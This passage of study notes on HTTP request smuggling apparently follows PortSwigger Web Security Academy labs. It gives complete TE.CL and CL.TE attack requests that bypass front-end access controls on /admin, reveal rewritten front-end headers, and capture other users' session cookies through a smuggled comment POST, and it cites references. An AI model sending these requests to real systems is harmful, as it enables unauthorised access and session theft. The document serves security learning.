> - [[🛠️ HTTP request smuggling labs#3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability]]

#### TE.CL access control bypass

- Attack request:

```http
POST / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

39␍␊
GET /admin HTTP/1.1␍␊
Host: localhost␍␊
Content-Length: 6␍␊
␍␊
0␍␊
␍␊
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a74000003865fc3804beea2009a00b9.web-security-academy.net
```

>[!bug]+ Labs
> - [[🛠️ HTTP request smuggling labs#14. HTTP request smuggling, basic TE.CL vulnerability]].

### Revealing front-end request rewriting

- Front-end proxies frequently modify incoming HTTP requests prior to backend forwarding, such as:
	- **TLS Termination:** Stripping TLS, appending headers specifying cipher suites (`X-Forwarded-Proto: https`).
	- **Client IP Tracking:** Appending `X-Forwarded-For: <client_ip>`.
	- **Authentication Tokens:** Injecting internal user IDs or client certificate data (`X-Client-Certificate`).
- Extract these hidden front-end headers by leveraging a reflected POST parameter:
	1. Identify a `POST` endpoint that reflects parameter input in the HTTP response.
	2. Position the reflected parameter as the final parameter in the smuggled request body.
	3. Smuggle the POST request with an elevated `Content-Length`, causing the backend to append the front-end's rewritten headers directly into the reflected parameter value.

#### CL.TE request rewriting extraction

- Attack request:

```http
POST / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=test
```

- Normal request:

```http
GET / HTTP/1.1
Host: 0a8900b804081270812d163c00e60094.web-security-academy.net
```

>[!bug]+ Labs
> - [[🛠️ HTTP request smuggling labs#5. Exploiting HTTP request smuggling to reveal front-end request rewriting]]

### Capturing authenticated user requests

- Capture session cookies, bearer tokens, or sensitive POST parameters belonging to other users by smuggling a POST request that targets a public storage feature (such as a comment form):

```http
POST / HTTP/1.1
Host: 0a72007603e8a25080fc3f57008f00c4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 281
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=YC4SoKojJVixyv8JMoK9A4eR9sAAKtkX
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

csrf=VPS3XF2V4jVWsvefPcNkduR2vHsqVaGI&postId=5&name=name&email=email%40example.com&website=https%3A%2F%2Fexample.com&comment=
```

- The smuggled request's `Content-Length: 400` exceeds its own body. When a victim user transmits a request over the coalesced backend socket, their complete request (including their session `Cookie` header) is appended to `comment=` and stored publicly in the application database.

## References and further reading

- [`RFC 7230 — HTTP/1.1 Message Syntax and Routing`](https://datatracker.ietf.org/doc/html/rfc7230)
- [`RFC 2616 — Hypertext Transfer Protocol -- HTTP/1.1`](https://datatracker.ietf.org/doc/html/rfc2616)
- [`HTTP Desync Attacks: Request Smuggling in the Modern Web — PortSwigger Research`](https://portswigger.net/research/http-desync-attacks-request-smuggling-in-the-modern-web)
- [`HTTP Request Smuggling — PortSwigger Web Security Academy`](https://portswigger.net/web-security/request-smuggling)
- [`Content-Length Header Specification — MDN Web Docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length)


